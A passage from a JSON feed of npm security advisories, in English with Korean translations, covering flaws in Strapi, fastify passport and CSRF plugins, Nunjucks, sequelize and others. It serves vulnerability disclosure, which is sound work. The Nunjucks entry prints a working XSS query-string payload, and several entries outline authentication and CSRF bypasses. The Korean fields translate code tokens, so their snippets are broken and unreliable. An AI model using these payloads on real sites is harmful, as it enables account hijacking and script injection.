    "descriptionKR": "0.19.2까지의 SheetJS CE의 모든 버전은 특별히 제작된 파일을 읽을 때 \"Prototype Pollution\"에 취약합니다. 임의 파일을 읽지 않는 워크플로(예: 스프레드시트 파일로 데이터 내보내기)는 영향을 받지 않습니다.\n\n취약하지 않은 버전은 npm을 통해 찾을 수 없습니다. GitHub에서 호스팅되는 리포지토리와 npm 패키지 'xlsx'가 더 이상 유지되지 않기 때문입니다."
  },
  {
    "description": "Strapi 3.2.1 until 4.6.0 does not verify the access or ID tokens issued during the OAuth flow when the AWS Cognito login provider is used for authentication. A remote attacker could forge an ID token that is signed using the 'None' type algorithm to bypass authentication and impersonate any user that use AWS Cognito for authentication.",
    "identifiers": "GHSA : GHSA-583x-23h9-f5w7\nCVE : CVE-2023-22893",
    "severity": "MODERATE",
    "updatedAt": "2023-04-24T18:43:52Z",
    "publishedAt": "2023-04-19T18:33:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-22893\nhttps://github.com/strapi/strapi/releases\nhttps://strapi.io/blog/security-disclosure-of-vulnerabilities-cve\nhttps://www.ghostccamm.com/blog/multi_strapi_vulns/\nhttps://github.com/strapi/strapi/commit/46f8f98378338f18b5c6139d0157a8f71bf4de83\nhttps://github.com/strapi/strapi/commit/8bbbd7383a20bb7cb163c8b462baffee559e994f\nhttps://github.com/strapi/strapi/commit/eeab43b57707d7ef275076d27be6eabc72bd71a7\nhttps://github.com/strapi/strapi/blob/v4.5.6/packages/plugins/users-permissions/server/services/providers-registry.js\nhttps://github.com/advisories/GHSA-583x-23h9-f5w7",
    "name": "@strapi/plugin-users-permissions",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.2.1, < 4.6.0",
    "identifier": "4.6.0",
    "descriptionKR": "Strapi 3.2.1에서 4.6.0까지는 AWS Cognito 로그인 공급자가 인증에 사용될 때 OAuth 흐름 중에 발급된 액세스 또는 ID 토큰을 확인하지 않습니다. 원격 공격자는 '없음' 유형 알고리즘을 사용하여 서명된 ID 토큰을 위조하여 인증을 우회하고 인증에 AWS Cognito를 사용하는 모든 사용자를 가장할 수 있습니다."
  },
  {
    "description": "Applications using `@fastify/passport` for user authentication, in combination with `@fastify/session` as the underlying session management mechanism, are vulnerable to [session fixation attacks](https://owasp.org/www-community/attacks/Session_fixation) from network and same-site attackers.\n\n## Details\nfastify applications rely on the `@fastify/passport` library for user authentication. The login and user validation are performed by the `authenticate` function. When executing this function, the `sessionId` is preserved between the pre-login and the authenticated session. Network and [same-site attackers](https://canitakeyoursubdomain.name/) can hijack the victim's session by tossing a valid `sessionId` cookie in the victim's browser and waiting for the victim to log in on the website.\n\n## Fix\nAs a solution, newer versions of `@fastify/passport` regenerate `sessionId` upon login, preventing the attacker-controlled pre-session cookie from being upgraded to an authenticated session.\n\n## Credits\n* Pedro Adão (@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina (@lavish), [Security & Privacy Research Unit, TU Wien](https://secpriv.wien/)",
    "identifiers": "GHSA : GHSA-4m3m-ppvx-xgw9\nCVE : CVE-2023-29019",
    "severity": "HIGH",
    "updatedAt": "2023-04-24T15:56:25Z",
    "publishedAt": "2023-04-21T22:33:30Z",
    "references": "https://github.com/fastify/fastify-passport/security/advisories/GHSA-4m3m-ppvx-xgw9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29019\nhttps://github.com/fastify/fastify-passport/commit/43c82c321db58ea3e375dd475de60befbfcf2a11\nhttps://owasp.org/www-community/attacks/Session_fixation\nhttps://github.com/advisories/GHSA-4m3m-ppvx-xgw9",
    "name": "@fastify/passport",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.3.0",
    "identifier": "2.3.0",
    "descriptionKR": "기본 세션 관리 메커니즘인 `@fastify/session`과 함께 사용자 인증에 `@fastify/passport`를 사용하는 애플리케이션은 [세션 고정 공격](https://owasp.org/www-community/attacks /Session_fixation) 네트워크 및 동일 사이트 공격자로부터.\n\n## 세부 정보\nfastify 애플리케이션은 사용자 인증을 위해 `@fastify/passport` 라이브러리에 의존합니다. 로그인 및 사용자 유효성 검사는 `authenticate` 기능에 의해 수행됩니다. 이 기능을 실행할 때 사전 로그인과 인증된 세션 간에 'sessionId'가 보존됩니다. 네트워크 및 [동일 사이트 공격자](https://canitakeyoursubdomain.name/)는 피해자의 브라우저에 유효한 `sessionId` 쿠키를 전송하고 피해자가 웹사이트에 로그인하기를 기다리면서 피해자의 세션을 하이재킹할 수 있습니다.\n\n## 고치다\n해결책으로 최신 버전의 `@fastify/passport`는 로그인 시 `sessionId`를 재생성하여 공격자가 제어하는 ​​사전 세션 쿠키가 인증된 세션으로 업그레이드되는 것을 방지합니다.\n\n## 학점\n* Pedro Adão(@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina(@lavish), [TU Wien 보안 및 개인 정보 보호 연구 부서](https://secpriv.wien/)"
  },
  {
    "description": "Applications using `@fastify/passport` for user authentication, in combination with `@fastify/session` as the underlying session management mechanism, are vulnerable to [session fixation attacks](https://owasp.org/www-community/attacks/Session_fixation) from network and same-site attackers.\n\n## Details\nfastify applications rely on the `@fastify/passport` library for user authentication. The login and user validation are performed by the `authenticate` function. When executing this function, the `sessionId` is preserved between the pre-login and the authenticated session. Network and [same-site attackers](https://canitakeyoursubdomain.name/) can hijack the victim's session by tossing a valid `sessionId` cookie in the victim's browser and waiting for the victim to log in on the website.\n\n## Fix\nAs a solution, newer versions of `@fastify/passport` regenerate `sessionId` upon login, preventing the attacker-controlled pre-session cookie from being upgraded to an authenticated session.\n\n## Credits\n* Pedro Adão (@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina (@lavish), [Security & Privacy Research Unit, TU Wien](https://secpriv.wien/)",
    "identifiers": "GHSA : GHSA-4m3m-ppvx-xgw9\nCVE : CVE-2023-29019",
    "severity": "HIGH",
    "updatedAt": "2023-04-24T15:56:25Z",
    "publishedAt": "2023-04-21T22:33:30Z",
    "references": "https://github.com/fastify/fastify-passport/security/advisories/GHSA-4m3m-ppvx-xgw9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29019\nhttps://github.com/fastify/fastify-passport/commit/43c82c321db58ea3e375dd475de60befbfcf2a11\nhttps://owasp.org/www-community/attacks/Session_fixation\nhttps://github.com/advisories/GHSA-4m3m-ppvx-xgw9",
    "name": "@fastify/passport",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "기본 세션 관리 메커니즘인 `@fastify/session`과 함께 사용자 인증에 `@fastify/passport`를 사용하는 애플리케이션은 [세션 고정 공격](https://owasp.org/www-community/attacks /Session_fixation) 네트워크 및 동일 사이트 공격자로부터.\n\n## 세부 정보\nfastify 애플리케이션은 사용자 인증을 위해 `@fastify/passport` 라이브러리에 의존합니다. 로그인 및 사용자 유효성 검사는 `authenticate` 기능에 의해 수행됩니다. 이 기능을 실행할 때 사전 로그인과 인증된 세션 간에 'sessionId'가 보존됩니다. 네트워크 및 [동일 사이트 공격자](https://canitakeyoursubdomain.name/)는 피해자의 브라우저에 유효한 `sessionId` 쿠키를 전송하고 피해자가 웹사이트에 로그인하기를 기다리면서 피해자의 세션을 하이재킹할 수 있습니다.\n\n## 고치다\n해결책으로 최신 버전의 `@fastify/passport`는 로그인 시 `sessionId`를 재생성하여 공격자가 제어하는 ​​사전 세션 쿠키가 인증된 세션으로 업그레이드되는 것을 방지합니다.\n\n## 학점\n* Pedro Adão(@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina(@lavish), [TU Wien 보안 및 개인 정보 보호 연구 부서](https://secpriv.wien/)"
  },
  {
    "description": "The [CSRF](https://owasp.org/www-community/attacks/csrf) protection enforced by the `@fastify/csrf-protection` library, when combined with `@fastify/passport`, can be bypassed by network and same-site attackers.\n\n## Details\n`fastify/csrf-protection` implements the [synchronizer token pattern](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern) (using plugins `@fastify/session` and `@fastify/secure-session`) by storing a random value used for CSRF token generation in the `_csrf` attribute of a user's session.\n\nThe `@fastify/passport` library does not clear the session object upon authentication, preserving the `_csrf` attribute between pre-login and authenticated sessions. Consequently, CSRF tokens generated before authentication are still valid. Network and [same-site attackers](https://canitakeyoursubdomain.name/) can thus obtain a CSRF token for their pre-session, fixate that pre-session in the victim's browser via cookie tossing, and then perform a CSRF attack after the victim authenticates.\n\n## Fix\nAs a solution, newer versions of `@fastify/passport` include the configuration options\n\n* `clearSessionOnLogin (default: true)` and\n* `clearSessionIgnoreFields (default: ['session'])`\n\nto clear all the session attributes by default, preserving those explicitly defined in `clearSessionIgnoreFields`.\n\n## Credits\n* Pedro Adão (@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina (@lavish), [Security & Privacy Research Unit, TU Wien](https://secpriv.wien/)",
    "identifiers": "GHSA : GHSA-2ccf-ffrj-m4qw\nCVE : CVE-2023-29020",
    "severity": "MODERATE",
    "updatedAt": "2023-04-24T15:56:29Z",
    "publishedAt": "2023-04-21T22:32:47Z",
    "references": "https://github.com/fastify/fastify-passport/security/advisories/GHSA-2ccf-ffrj-m4qw\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29020\nhttps://github.com/fastify/fastify-passport/commit/07c90feab9cba0dd4779e47cfb0717a7e2f01d3d\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern\nhttps://owasp.org/www-community/attacks/csrf\nhttps://github.com/advisories/GHSA-2ccf-ffrj-m4qw",
    "name": "@fastify/passport",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.3.0",
    "identifier": "2.3.0",
    "descriptionKR": "`@fastify/csrf-protection` 라이브러리에 의해 시행되는 [CSRF](https://owasp.org/www-community/attacks/csrf) 보호는 `@fastify/passport`와 결합될 때 네트워크에서 우회될 수 있습니다. 동일 사이트 공격자.\n\n## 세부사항\n`fastify/csrf-protection`은 [synchronizer 토큰 패턴](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern)을 구현합니다(플러그인 `@fastify/session` 및 `사용). @fastify/secure-session`) 사용자 세션의 `_csrf` 속성에 CSRF 토큰 생성에 사용되는 임의의 값을 저장합니다.\n\n`@fastify/passport` 라이브러리는 인증 시 세션 개체를 지우지 않고 사전 로그인 세션과 인증된 세션 사이의 `_csrf` 속성을 유지합니다. 결과적으로 인증 전에 생성된 CSRF 토큰은 여전히 ​​유효합니다. 따라서 네트워크 및 [동일 사이트 공격자](https://canitakeyoursubdomain.name/)는 사전 세션에 대한 CSRF 토큰을 획득하고 쿠키 던지기를 통해 피해자의 브라우저에서 해당 사전 세션을 고정한 다음 CSRF 공격을 수행할 수 있습니다. 피해자가 인증합니다.\n\n## 고치다\n해결책으로 최신 버전의 `@fastify/passport`에는 구성 옵션이 포함되어 있습니다.\n\n* `clearSessionOnLogin(기본값: true)` 및\n* `clearSessionIgnoreFields (기본값: ['session'])`\n\n기본적으로 모든 세션 속성을 지우고 `clearSessionIgnoreFields`에 명시적으로 정의된 속성을 유지합니다.\n\n## 학점\n* Pedro Adão(@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina(@lavish), [TU Wien 보안 및 개인 정보 보호 연구 부서](https://secpriv.wien/)"
  },
  {
    "description": "The [CSRF](https://owasp.org/www-community/attacks/csrf) protection enforced by the `@fastify/csrf-protection` library, when combined with `@fastify/passport`, can be bypassed by network and same-site attackers.\n\n## Details\n`fastify/csrf-protection` implements the [synchronizer token pattern](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern) (using plugins `@fastify/session` and `@fastify/secure-session`) by storing a random value used for CSRF token generation in the `_csrf` attribute of a user's session.\n\nThe `@fastify/passport` library does not clear the session object upon authentication, preserving the `_csrf` attribute between pre-login and authenticated sessions. Consequently, CSRF tokens generated before authentication are still valid. Network and [same-site attackers](https://canitakeyoursubdomain.name/) can thus obtain a CSRF token for their pre-session, fixate that pre-session in the victim's browser via cookie tossing, and then perform a CSRF attack after the victim authenticates.\n\n## Fix\nAs a solution, newer versions of `@fastify/passport` include the configuration options\n\n* `clearSessionOnLogin (default: true)` and\n* `clearSessionIgnoreFields (default: ['session'])`\n\nto clear all the session attributes by default, preserving those explicitly defined in `clearSessionIgnoreFields`.\n\n## Credits\n* Pedro Adão (@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina (@lavish), [Security & Privacy Research Unit, TU Wien](https://secpriv.wien/)",
    "identifiers": "GHSA : GHSA-2ccf-ffrj-m4qw\nCVE : CVE-2023-29020",
    "severity": "MODERATE",
    "updatedAt": "2023-04-24T15:56:29Z",
    "publishedAt": "2023-04-21T22:32:47Z",
    "references": "https://github.com/fastify/fastify-passport/security/advisories/GHSA-2ccf-ffrj-m4qw\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-29020\nhttps://github.com/fastify/fastify-passport/commit/07c90feab9cba0dd4779e47cfb0717a7e2f01d3d\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern\nhttps://owasp.org/www-community/attacks/csrf\nhttps://github.com/advisories/GHSA-2ccf-ffrj-m4qw",
    "name": "@fastify/passport",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "`@fastify/csrf-protection` 라이브러리에 의해 시행되는 [CSRF](https://owasp.org/www-community/attacks/csrf) 보호는 `@fastify/passport`와 결합될 때 네트워크에서 우회될 수 있습니다. 동일 사이트 공격자.\n\n## 세부사항\n`fastify/csrf-protection`은 [synchronizer 토큰 패턴](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern)을 구현합니다(플러그인 `@fastify/session` 및 `사용). @fastify/secure-session`) 사용자 세션의 `_csrf` 속성에 CSRF 토큰 생성에 사용되는 임의의 값을 저장합니다.\n\n`@fastify/passport` 라이브러리는 인증 시 세션 개체를 지우지 않고 사전 로그인 세션과 인증된 세션 사이의 `_csrf` 속성을 유지합니다. 결과적으로 인증 전에 생성된 CSRF 토큰은 여전히 ​​유효합니다. 따라서 네트워크 및 [동일 사이트 공격자](https://canitakeyoursubdomain.name/)는 사전 세션에 대한 CSRF 토큰을 획득하고 쿠키 던지기를 통해 피해자의 브라우저에서 해당 사전 세션을 고정한 다음 CSRF 공격을 수행할 수 있습니다. 피해자가 인증합니다.\n\n## 고치다\n해결책으로 최신 버전의 `@fastify/passport`에는 구성 옵션이 포함되어 있습니다.\n\n* `clearSessionOnLogin(기본값: true)` 및\n* `clearSessionIgnoreFields (기본값: ['session'])`\n\n기본적으로 모든 세션 속성을 지우고 `clearSessionIgnoreFields`에 명시적으로 정의된 속성을 유지합니다.\n\n## 학점\n* Pedro Adão(@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina(@lavish), [TU Wien 보안 및 개인 정보 보호 연구 부서](https://secpriv.wien/)"
  },
  {
    "description": "https://nuxt.com had a hardcoded GitHub token in the source code of the page. This token had access to multiple repositories under `nuxt`, `nuxtlabs` and `nuxt-themes` GitHub organizations. A patch in version 1.6.2 fixed the issue.",
    "identifiers": "GHSA : GHSA-fp2w-g92g-fgq4\nCVE : CVE-2023-2138",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-21T20:26:50Z",
    "publishedAt": "2023-04-18T03:30:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2138\nhttps://github.com/nuxtlabs/github-module/commit/5490c43f729eee60f07920bf88c0aabdc1398b6e\nhttps://huntr.dev/bounties/65096ef9-eafc-49da-b49a-5b88c0203ca6\nhttps://github.com/nuxtlabs/github-module/releases/tag/v1.6.2\nhttps://github.com/advisories/GHSA-fp2w-g92g-fgq4",
    "name": "@nuxtlabs/github-module",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.2",
    "identifier": "1.6.2",
    "descriptionKR": "https://nuxt.com에는 페이지의 소스 코드에 하드코딩된 GitHub 토큰이 있습니다. 이 토큰은 `nuxt`, `nuxtlabs` 및 `nuxt-themes` GitHub 조직 아래의 여러 리포지토리에 액세스할 수 있었습니다. 버전 1.6.2의 패치로 문제가 해결되었습니다."
  },
  {
    "description": "Affected versions of `sequelize` are vulnerable to SQL Injection in Models that have fields with the `GEOMETRY` DataType. This vulnerability occurs because single quotes in document values are not escaped for GeoJSON documents using `ST_GeomFromGeoJSON`, and MySQL GeoJSON documents using `GeomFromText`.\n\n\n## Recommendation\n\nUpdate to version 3.23.6 or later.",
    "identifiers": "GHSA : GHSA-5v9h-q3gj-c32x\nCVE : CVE-2016-1000225",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-21T18:34:24Z",
    "publishedAt": "2020-09-01T15:27:40Z",
    "references": "https://github.com/sequelize/sequelize/issues/6194\nhttps://nvd.nist.gov/vuln/detail/CVE-2016-1000225\nhttps://snyk.io/vuln/npm:sequelize:20160718\nhttps://github.com/sequelize/sequelize/pull/6302\nhttps://github.com/sequelize/sequelize/pull/6306\nhttps://github.com/sequelize/sequelize/commit/14e3deaf3ad27f12900e5275db1d448844c9de3e\nhttps://github.com/sequelize/sequelize/commit/18ac91040d9c57351d26ba998f460e214255b704\nhttps://github.com/sequelize/sequelize/commit/562d52585902090f4e53eb21c61314098c29d795\nhttps://github.com/sequelize/sequelize/commit/f93af43a1d86400487f5e3d9762f1a4b7cf6b1e1\nhttps://github.com/advisories/GHSA-5v9h-q3gj-c32x",
    "name": "sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.4.0, < 3.23.6",
    "identifier": "3.23.6",
    "descriptionKR": "영향을 받는 `sequelize` 버전은 `GEOMETRY` DataType이 있는 필드가 있는 모델에서 SQL 주입에 취약합니다. 이 취약점은 `ST_GeomFromGeoJSON`을 사용하는 GeoJSON 문서 및 `GeomFromText`를 사용하는 MySQL GeoJSON 문서에 대해 문서 값의 작은따옴표가 이스케이프되지 않기 때문에 발생합니다.\n\n\n## 추천\n\n버전 3.23.6 이상으로 업데이트하십시오."
  },
  {
    "description": "### Impact\nIn Nunjucks versions prior to version 3.2.4, it was possible to bypass the restrictions which are provided by the autoescape functionality. If there are two user-controlled parameters on the same line used in the views, it was possible to inject cross site scripting payloads using the backslash `\\` character.\n\n#### Example\nIf the user-controlled parameters were used in the views similar to the following:\n```\n<script>\nlet testObject = { lang: '{{ lang }}', place: '{{ place }}' };\n</script>\n```\n\nIt is possible to inject XSS payload using the below parameters:\n```\nhttps://<application-url>/?lang=jp\\&place=};alert(document.domain)//\n```\n\n### Patches\nThe issue was patched in version 3.2.4.\n\n### References\n\n- https://bugzilla.mozilla.org/show_bug.cgi?id=1825980\n",
    "identifiers": "GHSA : GHSA-x77j-w7wf-fjmw\nCVE : CVE-2023-2142",
    "severity": "MODERATE",
    "updatedAt": "2023-04-20T21:19:27Z",
    "publishedAt": "2023-04-20T21:19:24Z",
    "references": "https://github.com/mozilla/nunjucks/security/advisories/GHSA-x77j-w7wf-fjmw\nhttps://github.com/mozilla/nunjucks/pull/1437\nhttps://github.com/mozilla/nunjucks/commit/ec16d210e7e13f862eccdb0bc9af9f60ff6749d6\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1825980\nhttps://github.com/mozilla/nunjucks/releases/tag/v3.2.4\nhttps://github.com/advisories/GHSA-x77j-w7wf-fjmw",
    "name": "nunjucks",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.4",
    "identifier": "3.2.4",
    "descriptionKR": "### 영향\n버전 3.2.4 이전의 Nunjucks 버전에서는 자동 탈출 기능이 제공하는 제한을 우회할 수 있었습니다. 보기에서 사용된 동일한 행에 두 개의 사용자 제어 매개변수가 있는 경우 백슬래시 `\\` 문자를 사용하여 크로스 사이트 스크립팅 페이로드를 삽입할 수 있었습니다.\n\n#### 예\n사용자 제어 매개변수가 다음과 유사한 보기에서 사용된 경우:\n```\n<스크립트>\nlet testObject = { lang: '{{ lang }}', 장소: '{{ 장소 }}' };\n</스크립트>\n```\n\n아래 매개변수를 사용하여 XSS 페이로드를 주입할 수 있습니다.\n```\nhttps://<application-url>/?lang=jp\\&place=};alert(문서.도메인)//\n```\n\n### 패치\n이 문제는 버전 3.2.4에서 패치되었습니다.\n\n### 참조\n\n- https://bugzilla.mozilla.org/show_bug.cgi?id=1825980"
  },
  {
    "description": "## Description\nThe [CSRF](https://owasp.org/www-community/attacks/csrf) protection enforced by the `@fastify/csrf-protection` library in combination with `@fastify/cookie` can be bypassed from network and same-site attackers under certain conditions.\n\n`@fastify/csrf-protection` supports an optional `userInfo` parameter that binds the CSRF token to the user. This parameter has been introduced to prevent cookie-tossing attacks as a fix for [CVE-2021-29624](https://www.cvedetails.com/cve/CVE-2021-29624). Whenever `userInfo` parameter is missing, or its value can be predicted for the target user account, network and [same-site](https://canitakeyoursubdomain.name/) attackers can 1. fixate a `_csrf` cookie in the victim's browser, and 2. forge CSRF tokens that are valid for the victim's session. This allows attackers to bypass the CSRF protection mechanism.\n\nAs a fix, `@fastify/csrf-protection` starting from version 6.3.0 (and v4.1.0) includes a server-defined secret `hmacKey` that cryptographically binds the CSRF token to the value of the `_csrf` cookie and the `userInfo` parameter, making tokens non-spoofable by attackers. This protection is effective as long as the `userInfo` parameter is unique for each user.\n\n### Patches\n\nThis is patched in version 6.3.0 and v4.1.0.\n\n### Workarounds\n\nAs a workaround, developers can use a random, non-predictable `userInfo` parameter for each user.\n\n## Credits\n* Pedro Adão (@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina (@lavish), [Security & Privacy Research Unit, TU Wien](https://secpriv.wien/)",
    "identifiers": "GHSA : GHSA-qrgf-9gpc-vrxw\nCVE : CVE-2023-27495",
    "severity": "MODERATE",
    "updatedAt": "2023-04-20T21:18:52Z",
    "publishedAt": "2023-04-20T21:18:51Z",
    "references": "https://github.com/fastify/csrf-protection/security/advisories/GHSA-qrgf-9gpc-vrxw\nhttps://github.com/fastify/csrf-protection/security/advisories/GHSA-rc4q-9m69-gqp8\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-27495\nhttps://github.com/fastify/csrf-protection/commit/be3e5761f37aa05c7c1ac8ed44499c51ecec8058\nhttps://github.com/fastify/csrf-protection/releases/tag/v4.1.0\nhttps://github.com/fastify/csrf-protection/releases/tag/v6.3.0\nhttps://www.cvedetails.com/cve/CVE-2021-29624\nhttps://github.com/advisories/GHSA-qrgf-9gpc-vrxw",
    "name": "@fastify/csrf-protection",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 6.3.0",
    "identifier": "6.3.0",
    "descriptionKR": "## 설명\n`@fastify/cookie`와 함께 `@fastify/csrf-protection` 라이브러리에 의해 시행되는 [CSRF](https://owasp.org/www-community/attacks/csrf) 보호는 네트워크에서 우회할 수 있으며 동일한 -특정 조건에서 사이트 공격자.\n\n`@fastify/csrf-protection`은 CSRF 토큰을 사용자에게 바인딩하는 선택적 `userInfo` 매개변수를 지원합니다. 이 매개변수는 [CVE-2021-29624](https://www.cvedetails.com/cve/CVE-2021-29624)에 대한 수정으로 쿠키 던지기 공격을 방지하기 위해 도입되었습니다. 'userInfo' 매개변수가 누락되거나 대상 사용자 계정, 네트워크 및 [same-site](https://canitakeyoursubdomain.name/)에 대한 값을 예측할 수 있을 때마다 공격자는 1. 피해자의 '_csrf' 쿠키를 고정할 수 있습니다. 브라우저 및 2. 피해자의 세션에 유효한 CSRF 토큰을 위조합니다. 이를 통해 공격자는 CSRF 보호 메커니즘을 우회할 수 있습니다.\n\n수정 사항으로 버전 6.3.0(및 v4.1.0)부터 시작하는 `@fastify/csrf-protection`에는 CSRF 토큰을 `_csrf` 쿠키의 값에 암호화 방식으로 바인딩하는 서버 정의 비밀 `hmacKey`가 포함되어 있으며 공격자가 토큰을 스푸핑할 수 없게 만드는 'userInfo' 매개변수. 이 보호는 `userInfo` 매개변수가 각 사용자에 대해 고유한 한 유효합니다.\n\n### 패치\n\n이는 버전 6.3.0 및 v4.1.0에서 패치되었습니다.\n\n### 해결 방법\n\n해결 방법으로 개발자는 각 사용자에 대해 예측할 수 없는 임의의 'userInfo' 매개변수를 사용할 수 있습니다.\n\n## 학점\n* Pedro Adão(@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina(@lavish), [TU Wien 보안 및 개인 정보 보호 연구 부서](https://secpriv.wien/)"
  },
  {
    "description": "## Description\nThe [CSRF](https://owasp.org/www-community/attacks/csrf) protection enforced by the `@fastify/csrf-protection` library in combination with `@fastify/cookie` can be bypassed from network and same-site attackers under certain conditions.\n\n`@fastify/csrf-protection` supports an optional `userInfo` parameter that binds the CSRF token to the user. This parameter has been introduced to prevent cookie-tossing attacks as a fix for [CVE-2021-29624](https://www.cvedetails.com/cve/CVE-2021-29624). Whenever `userInfo` parameter is missing, or its value can be predicted for the target user account, network and [same-site](https://canitakeyoursubdomain.name/) attackers can 1. fixate a `_csrf` cookie in the victim's browser, and 2. forge CSRF tokens that are valid for the victim's session. This allows attackers to bypass the CSRF protection mechanism.\n\nAs a fix, `@fastify/csrf-protection` starting from version 6.3.0 (and v4.1.0) includes a server-defined secret `hmacKey` that cryptographically binds the CSRF token to the value of the `_csrf` cookie and the `userInfo` parameter, making tokens non-spoofable by attackers. This protection is effective as long as the `userInfo` parameter is unique for each user.\n\n### Patches\n\nThis is patched in version 6.3.0 and v4.1.0.\n\n### Workarounds\n\nAs a workaround, developers can use a random, non-predictable `userInfo` parameter for each user.\n\n## Credits\n* Pedro Adão (@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina (@lavish), [Security & Privacy Research Unit, TU Wien](https://secpriv.wien/)",
    "identifiers": "GHSA : GHSA-qrgf-9gpc-vrxw\nCVE : CVE-2023-27495",
    "severity": "MODERATE",
    "updatedAt": "2023-04-20T21:18:52Z",
    "publishedAt": "2023-04-20T21:18:51Z",
    "references": "https://github.com/fastify/csrf-protection/security/advisories/GHSA-qrgf-9gpc-vrxw\nhttps://github.com/fastify/csrf-protection/security/advisories/GHSA-rc4q-9m69-gqp8\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-27495\nhttps://github.com/fastify/csrf-protection/commit/be3e5761f37aa05c7c1ac8ed44499c51ecec8058\nhttps://github.com/fastify/csrf-protection/releases/tag/v4.1.0\nhttps://github.com/fastify/csrf-protection/releases/tag/v6.3.0\nhttps://www.cvedetails.com/cve/CVE-2021-29624\nhttps://github.com/advisories/GHSA-qrgf-9gpc-vrxw",
    "name": "@fastify/csrf-protection",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.0",
    "identifier": "4.1.0",
    "descriptionKR": "## 설명\n`@fastify/cookie`와 함께 `@fastify/csrf-protection` 라이브러리에 의해 시행되는 [CSRF](https://owasp.org/www-community/attacks/csrf) 보호는 네트워크에서 우회할 수 있으며 동일한 -특정 조건에서 사이트 공격자.\n\n`@fastify/csrf-protection`은 CSRF 토큰을 사용자에게 바인딩하는 선택적 `userInfo` 매개변수를 지원합니다. 이 매개변수는 [CVE-2021-29624](https://www.cvedetails.com/cve/CVE-2021-29624)에 대한 수정으로 쿠키 던지기 공격을 방지하기 위해 도입되었습니다. 'userInfo' 매개변수가 누락되거나 대상 사용자 계정, 네트워크 및 [same-site](https://canitakeyoursubdomain.name/)에 대한 값을 예측할 수 있을 때마다 공격자는 1. 피해자의 '_csrf' 쿠키를 고정할 수 있습니다. 브라우저 및 2. 피해자의 세션에 유효한 CSRF 토큰을 위조합니다. 이를 통해 공격자는 CSRF 보호 메커니즘을 우회할 수 있습니다.\n\n수정 사항으로 버전 6.3.0(및 v4.1.0)부터 시작하는 `@fastify/csrf-protection`에는 CSRF 토큰을 `_csrf` 쿠키의 값에 암호화 방식으로 바인딩하는 서버 정의 비밀 `hmacKey`가 포함되어 있으며 공격자가 토큰을 스푸핑할 수 없게 만드는 'userInfo' 매개변수. 이 보호는 `userInfo` 매개변수가 각 사용자에 대해 고유한 한 유효합니다.\n\n### 패치\n\n이는 버전 6.3.0 및 v4.1.0에서 패치되었습니다.\n\n### 해결 방법\n\n해결 방법으로 개발자는 각 사용자에 대해 예측할 수 없는 임의의 'userInfo' 매개변수를 사용할 수 있습니다.\n\n## 학점\n* Pedro Adão(@pedromigueladao), [Instituto Superior Técnico, University of Lisbon](https://tecnico.ulisboa.pt/)\n* Marco Squarcina(@lavish), [TU Wien 보안 및 개인 정보 보호 연구 부서](https://secpriv.wien/)"
  },
  {
    "description": "A vulnerability was found in mportuga eslint-detailed-reporter up to 0.9.0 and classified as problematic. Affected by this issue is the function renderIssue in the library lib/template-generator.js. The manipulation of the argument message leads to cross site scripting. The attack may be launched remotely. The name of the patch is 505c190efd4905990db6207863bdcbd9b1d7e1bd. It is recommended to apply a patch to fix this issue. VDB-226310 is the identifier assigned to this vulnerability.",
